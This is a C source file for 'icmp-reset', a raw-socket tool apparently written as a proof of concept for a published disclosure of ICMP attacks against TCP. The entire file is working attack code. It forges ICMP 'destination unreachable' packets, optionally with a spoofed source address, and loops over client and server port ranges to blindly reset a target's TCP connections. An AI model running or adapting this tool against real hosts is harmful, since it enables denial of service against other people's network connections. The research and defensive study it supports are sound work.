/*
 * icmp-reset.c
 *
 * Author: Fernando Gont <fernando@gont.com.ar>
 * 
 * This program tries to perform the ICMP-based blind connection-reset
 * attack described in
 * http://www.gont.com.ar/drafts/icmp-attacks-against-tcp.html
 * 
 */

#include <stdio.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>	
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <time.h>
#include <getopt.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

#define IPHEADER 20
#define TCPHEADER64 8
#define ICMPHEADER 8
#define PACKETSIZE IPHEADER+ICMPHEADER+IPHEADER+TCPHEADER64
#define BUFSIZE PACKETSIZE
#define TCLIENT 1
#define TSERVER 2

u_int16_t in_chksum(u_int16_t *, size_t);
static void sig_int(int);

unsigned long rounds;

void usage(void);

int main(int argc, char **argv) {
	int sockfd;

	const int on=1;

	unsigned char buffer[BUFSIZE];
	unsigned char *bufptr;
	
	u_int16_t	clientporth, clientportl, serverporth, serverportl,
			targetport, peerport, targetporth, targetportl,
			peerporth, peerportl;

	u_int16_t	ippsize;
	
	struct timespec delay;
	unsigned long nanoseconds, rate, portrange, pause;
	
	u_int8_t ipttl, ippttl, ipid, ippid, icmpcode, iptos, ipptos;
	struct ip *ip;
	struct icmp *icmp;
	struct tcphdr *tcphdr;
	struct sockaddr_in targetaddr;
	struct in_addr sourceip, destip, targetip, peerip;
	
	static struct option longopts[] = {
		{"client", required_argument, 0, 'c'},
		{"server", required_argument, 0, 's'},
		{"target", required_argument, 0, 't'},
		{"noforge", no_argument, 0, 'n'},
		{"forge", required_argument, 0, 'f'},
		{"rate", required_argument, 0, 'r'},
		{"delay", required_argument, 0, 'd'},
		{"pause", required_argument, 0, 'D'},
		{"icmp-code", required_argument, 0, 'i'},
		{"ttl", required_argument, 0, 'l'},
		{"payload-ttl", required_argument, 0, 'L'},
		{"id", required_argument, 0, 'p'},
		{"payload-id", required_argument, 0, 'P'},
		{"tos", required_argument, 0, 'o'},
		{"payload-tos", required_argument, 0, 'O'},
		{"payload-size", required_argument, 0, 'z'},
		{"tcp-seq", required_argument, 0, 'q'},
		{"verbose", no_argument, 0, 'v'},
		{"target-is-client", no_argument, 0, 'C'},
		{"target-is-server", no_argument, 0, 'S'},
		{"help", no_argument, 0, 'h'}
	};

	char option;
	unsigned char delay_f=0, rate_f=0;
	unsigned char cliip_f=0, cliporth_f=0, cliportl_f=0;
	unsigned char srvip_f=0, srvporth_f=0, srvportl_f=0, target_f=0;
	unsigned char forge_f=0, noforge_f=0, ipttl_f=0, ippttl_f=0;
	unsigned char ipid_f=0, ippid_f=0, tcpseq_f=0, pause_f;
	char *lasts;
	char tok1[]=":";
	char tok2[]="-/";
	in_addr_t clientip, serverip, forgeip;
	char *cliip, *srvip, *cliporth, *cliportl, *srvporth, *srvportl;

	char *type3codes[] = {
		"Network unreachable",
		"Host unreachable",
		"Protocol unreachable",
		"Port unreachable",
		"Fragmentation needed and don't fragment was set",
		"Source route failed",
		"Destination network unknown",
		"Destination host unknown",
		"Source host isolated",
		"Communication with destination network is administratively prohibited",
		"Communication with destination host is administratively prohibited",
		"Destination network unreachable for type of service",
		"Destination host unreachable for type of service",
		"Communication administratively prohibited",
		"Host precedence violation",
		"Precedence cutoff in effect"
	};

	unsigned char verbose_f=0;
	size_t	ipheader, packetsize;
	
	extern char *optarg;
	extern int optind;

	u_int32_t tcpseq; 
	
	optarg=buffer;

	icmpcode= ICMP_UNREACH_PROTOCOL;	/* (Default)  */
	iptos= 0x00;
	ipptos= 0x00;
	ippsize= 576;

	if(argc<=1){
		usage();
		exit(1);
	}

	while((option=getopt_long(argc, argv, "c:s:t:nhr:f:d:D:i:l:L:p:P:o:O:z:q:vCS", longopts, NULL)) != -1) {
		switch(option) {
			case 'c':	/* Client data */
				if((cliip=strtok_r(optarg, tok1, &lasts)) != NULL) {
					cliip_f=1;
					clientip= inet_addr(cliip);
					if((cliportl= strtok_r(NULL, tok2, &lasts)) != NULL) {
						cliportl_f=1;
						clientportl= (u_int16_t) atoi(cliportl);
						if((cliporth = strtok_r(NULL, tok2, &lasts)) != NULL) {
							cliporth_f=1;
							clientporth=(u_int16_t) atoi(cliporth); 
						}
					}
				}
				break;
				
			case 's':	/* Server data */	
				if((srvip=strtok_r(optarg, tok1, &lasts)) != NULL) {
					srvip_f=1;
					serverip= inet_addr(srvip);
					if((srvportl= strtok_r(NULL, tok2, &lasts)) != NULL) {
						srvportl_f=1;
						serverportl= (u_int16_t) atoi(srvportl);
						if((srvporth= strtok_r(NULL, tok2, &lasts)) != NULL) {
							srvporth_f=1;
							serverporth=(u_int16_t) atoi(srvporth);
						}
					}
				}
				break;

			case 't':	/* Target */
				if(strcmp(optarg, "client") == 0) {
					target_f=TCLIENT;
				} else {
					target_f=TSERVER;
				}
				break;

			case 'C':	/* Target is "client" */
				target_f=TCLIENT;
				break;

			case 'S':	/* Target is "server" */
				target_f=TSERVER;
				break;

			case 'o':	/* TOS of the ICMP packet */
				iptos= abs(atoi(optarg));
				break;

			case 'O':	/* TOS of the payload packet */
				ipptos= abs(atoi(optarg));
				break;

			case 'z':	/* Size of IP payload */
				ippsize = abs(atoi(optarg));
				break;

			case 'n':	/* Don't forge source address */
				if(forge_f == 1) {
					puts("'forge' and 'noforge' options are incompatible");
					usage();
					exit(1);
				} else {
					noforge_f=1;
				}
				break;

			case 'f':		/* Forge this address */
				if(noforge_f == 1) {
					puts("'forge' and 'noforge' options are incompatible");
					usage();
					exit(1);
				} else {
					forge_f=1;
					forgeip= inet_addr(optarg);
				}
				break;

			case 'r':		/* Data rate */
				if(delay_f == 1) {
					puts("'rate' and 'delay' options are incompatible");
					usage();
					exit(1);
				} else {
					rate= strtoul(optarg, NULL, 10);
					if(rate>0){
						delay.tv_sec=0;
						delay.tv_nsec=544000000/rate;
						rate_f=1;
					}
				}
				break;

			case 'd':			/* Delay */
				if(rate_f == 1) {
					puts("'rate' and 'delay' options are incompatible");
					exit(1);
				} else {
					nanoseconds= strtoul(optarg, NULL, 10);
					if(nanoseconds>0){
						delay.tv_sec= nanoseconds/1000000000;
						delay.tv_nsec= nanoseconds%1000000000;
						delay_f = 1;
					}
				}
				break;

			case 'D':
				pause= strtoul(optarg, NULL, 10);
				pause_f=1;
				break;


			case 'i':	/* Specify ICMP code */
				icmpcode=abs(atoi(optarg));
				if(icmpcode > 15) {
					puts("Invalid ICMP code");
					exit(1);
				}
				break;

			case 'l':	/* ICMP packet TTL */
				ipttl= atoi(optarg);
				ipttl_f=1;
				break;

			case 'L':	/* Payload packet TTL */
				ippttl=atoi(optarg);
				ippttl_f=1;
				break;

			case 'q':	/* TCP sequence number */
				tcpseq= strtoul(optarg, NULL, 10);
				tcpseq_f=1;
				break;

			case 'v':	/* Be verbose */
				verbose_f=1;
				break;

			case 'h':	/* help */
				puts( "icmp-reset\nAn ICMP-based blind connection-reset attack implementation.\n");
				usage();
				puts(	"\nOPTIONS:\n"
							"  --server, -s  	Server IP (required) and optional port\n"
							"  --client, -c  	Client IP (required) and optional port\n"
							"  --target,-t   	Set target (client or server)\n"
							"  --rate, -r    	Set data rate (in kbps)\n"
							"  --delay, -d   	Set delay between packets (in nanoseconds)\n"
							"  --pause, -D		Pause to be perfomed between each round (in seconds)\n"
							"  --forge, -f   	Forge source IP address\n"
							"  --noforge, -n 	Do not forge source IP address\n"
							"  --ttl, -l     	Set the TTL\n"
							"  --payload-ttl, -L    	Set the TTL (payload)\n"
							"  --id, -p	 	Set the IP ID field\n"
							"  --payload-id, -P 	Set the IP ID field (payload)\n"
							"  --tos, -o	 	Set the TOS field\n"
							"  --payload-tos, -O	Set the TOS field (payload)\n"
							"  --payload-size, -z	Set the size of the IP datagram (payload)\n"
							"  --icmp-code, -i 	Set ICMP type 3 code (0-15) [default: 2]\n"
							"  --target-is-client, -C : same as '-t client'\n"
							"  --target-is-server, -S : same as '-t server'\n"
							"  --tcp-seq, -q 	Set the TCP sequence number\n"
							"  --verbose, -v 	Be verbose\n"
							"\n"
							"Written by Fernando Gont <fernando@gont.com.ar>\n"
							"http://www.gont.com.ar/drafts/icmp-attacks-against-tcp.html"
				);
				exit(1);
				break;

			default:
				usage();
				exit(1);
				break;
		} /* switch */
	} /* while(getopt) */

	if(getuid()) {
		puts("icmp-reset needs root privileges to run.");
		exit(1);
	}

	if(!cliip_f) {
		puts("Missing client IP address");
		usage();
		exit(1);
	}

	if(!srvip_f) {
		puts("Missing server IP address");
		usage();
		exit(1);
	}

	if(!cliporth_f) {
		if(cliportl_f) {
			clientporth=clientportl;
		} else {
			clientportl=0;
			clientporth=65535;
		}
	}

	if(!srvporth_f) {
		if(srvportl_f) {
			serverporth=serverportl;
		} else {
			serverportl=0;
			serverporth=65535;
		}
	}

	if(target_f==TCLIENT) {
		targetip.s_addr=clientip;
		peerip.s_addr=serverip;
		destip.s_addr=clientip;
		targetporth=clientporth;
		targetportl=clientportl;
		peerporth=serverporth;
		peerportl=serverportl;
	} else {
		targetip.s_addr=serverip;
		peerip.s_addr=clientip;
		destip.s_addr=serverip;
		targetporth=serverporth;
		targetportl=serverportl;
		peerporth=clientporth;
		peerportl=clientportl;
	}

	if(forge_f) {
		sourceip.s_addr=forgeip;
	} else {
		sourceip=peerip;
	}

	if(noforge_f){
		ipheader=0;
		packetsize= ICMPHEADER+IPHEADER+TCPHEADER64;
	}
	else{
		ipheader=IPHEADER;
		packetsize= IPHEADER+ICMPHEADER+IPHEADER+TCPHEADER64;
	}

	if(verbose_f){
		portrange= (targetporth-targetportl+1)*(peerporth-peerportl+1);
		if(portrange){
			printf("Sending %lu packets to %s\n", portrange, inet_ntoa(targetip));
		}
		else{
			printf("Sending 4294967296 packets to %s\n", inet_ntoa(targetip));
		}

		if(rate_f){
			printf("Bandwidth: %lu kbps\n", rate);
		}
		else if(delay_f){
			printf("Sleeping %lu nanoseconds between each packet\n", nanoseconds);
		}
		else{
			puts("Bandwidth: No limit");
		}

		if(pause_f){
			printf("Sleeping %lu seconds between each round\n", pause);
		}

		printf("Source IP address: %s (%s)\n",inet_ntoa(sourceip),(noforge_f ? "NOT FORGED" : "forged"));
		printf("ICMP code: %d (\"%s\")\n",icmpcode,type3codes[icmpcode]);

		if(ipid_f){
			printf("IP ID: %u\n", ipttl);
		}
		else{
			puts("IP ID: Randomized");
		}

		if(ipttl_f){
			printf("IP TTL: %u\n", ipttl);
		}
		else{
			puts("IP TTL: Randomized");
		}

		printf("IP TOS: %u\n", iptos);

		if(ippid_f){
			printf("IP payload ID: %u\n", ippid);
		}
		else{
			puts("IP payload ID: Randomized");
		}

		if(ippttl_f){
			printf("IP payload TTL: %u\n", ippttl);
		}
		else{
			puts("IP payload TTL: Randomized");
		}

		printf("IP payload TOS: %u\n", ipptos);
		printf("IP payload size: %u\n", ippsize);

		if(tcpseq_f){
			printf("TCP SEQ: %lu\n", (unsigned long) tcpseq);
		}
		else{
			puts("TCP SEQ: Randomized");
		}
	}



	bzero(&targetaddr, sizeof(targetaddr));
	targetaddr.sin_family= AF_INET;
	targetaddr.sin_addr.s_addr=targetip.s_addr;


	if((sockfd= socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) <0) {
		perror("socket");
		exit(1);
	}


	if(!noforge_f){
		if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on))<0){
			perror("setsockopt");
			exit(1);
		}
	}

	rounds=0;
	srand(time(NULL));

	if(signal(SIGINT, sig_int) == SIG_ERR){
		perror("signal");
		exit(1);
	}
	

	while(1){

	for(targetport= targetportl; targetport<= targetporth; targetport++) {
		for(peerport=peerportl; peerport<=peerporth; peerport++){


			bufptr = buffer;

			if(!noforge_f){
				/* Fill our IP header */
				ip=(struct ip *) bufptr;
				ip->ip_v = 4;	/* IPv4 */
				ip->ip_hl= 20 >> 2;
				ip->ip_tos= iptos;

				ip->ip_len= htons(PACKETSIZE);
				ip->ip_src=sourceip; 
				ip->ip_dst=destip;

				if(ipid_f){
					ip->ip_id= ipid;
				}
				else{
#if RANDMAX >= 65535
					ip->ip_id= rand()%65536;
#else
					ip->ip_id= (u_int16_t) ((rand()*rand())%65536);
#endif
				}

				ip->ip_off= 0;

				if(ipttl_f){
					ip->ip_ttl=ipttl;
				}
				else{
					ip->ip_ttl= 60+rand()%196;	/* Random (default) */
				}

				ip->ip_p= IPPROTO_ICMP;
				ip->ip_sum = 0;
				ip->ip_sum = in_chksum((u_int16_t *) ip, IPHEADER);

			}  /* End of if(!no_forge)   */


	/* Fill the IP header contained in the payload of ICMP message */

			ip=(struct ip *) (bufptr+ipheader+ICMPHEADER);
			ip->ip_v = 4;			 /* IPv4 */
			ip->ip_hl= 20 >> 2;
			ip->ip_tos= ipptos;
			ip->ip_len= htons(ippsize);
			ip->ip_src=targetip;
			ip->ip_dst=peerip;

			if(ippid_f){
				ip->ip_id= ippid;
			}
			else{
#if RANDMAX >= 65535
				ip->ip_id= rand()%65536;
#else
				ip->ip_id= (u_int16_t) ((rand()*rand())%65536);
#endif
			}

			ip->ip_off= 0;

			if(ippttl_f){
				ip->ip_ttl= ippttl;	/* parámetro -L */
			}
			else{
				ip->ip_ttl= 60 + rand()%196;
			}

			ip->ip_p= IPPROTO_TCP;
			ip->ip_sum = 0;
			ip->ip_sum = in_chksum((u_int16_t *) ip, IPHEADER);


	/* Fill the TCP header contained in the ICMP message */

			tcphdr= (struct tcphdr *) (bufptr+ipheader+ICMPHEADER+IPHEADER);
			tcphdr->th_sport= htons(targetport); 
			tcphdr->th_dport= htons(peerport); 

			if(tcpseq_f){
				tcphdr->th_seq= htonl(tcpseq);
			}
			else{
#if RAND_MAX >= 4294967295  /* (2**32) - 1  */
				tcphdr->th_seq= (u_int32_t) (rand()%4294967295);
#elsif RAND_MAX >= 65535 
				tcphdr->th_seq= (u_int32_t)rand()* (u_int32_t)rand();
#else
				tcphdr->th_seq= (u_int32_t)rand() * (u_int32_t) rand()* (u_int32_t) rand();
#endif

			}
	

			/* Fill the header of our ICMP error message */

			icmp = (struct icmp *)(bufptr+ipheader);
			icmp->icmp_type=ICMP_UNREACH;
			icmp->icmp_code=icmpcode;

			bzero(bufptr+ipheader+4, 4); 

			icmp->icmp_cksum= 0;
			icmp->icmp_cksum= in_chksum((u_int16_t *) icmp, (ICMPHEADER+IPHEADER+TCPHEADER64));

			if(sendto(sockfd, bufptr, packetsize, 0, (struct sockaddr *) &targetaddr, sizeof(targetaddr))== -1) {
				perror("sendto");
				exit(1);
			}

			if(delay_f==1) {
				nanosleep(&delay, NULL);
			}

		}	 /* for(peerport)	*/
	}	 /* for(targetport)	*/

	if(pause_f){
		sleep(pause);
	}

	rounds++;

	} /* while(1) */


	return(0);
} 



/* 
 * Calculate the 16-bit Internet checksum
 * The same algorithm is used to calculate the IP checksum and the 
 * ICMP checksum.
 */
u_int16_t in_chksum(u_int16_t *addr, size_t len){
	size_t nleft;
	unsigned int sum = 0;
	u_int16_t *w;
	u_int16_t answer = 0;

	nleft=len;
	w=addr;

	while(nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if(nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return(answer);
}


/*
 * sig_int
 */

static void sig_int(int signo){
	printf("\nDone %lu round%s.\n", rounds, (rounds>1)?"s":"");
	exit(1);
}



/*
 * usage
 *
 */
void usage(void) {
	/* TODO: actualizar */
	puts("usage: icmp-reset -c CLIENT_IP[:PORT] -s SERVER_IP[:PORT] [-t client|server] [-n | -f SOURCE_ADDRESS] [-r RATE | -d DELAY] [-D PAUSE] [-l IP_TTL] [-L IPP_TTL] [-o IP_TOS] [-O IPP_TOS] [-z IP_SIZE] [-q TCP_SEQ]");
}
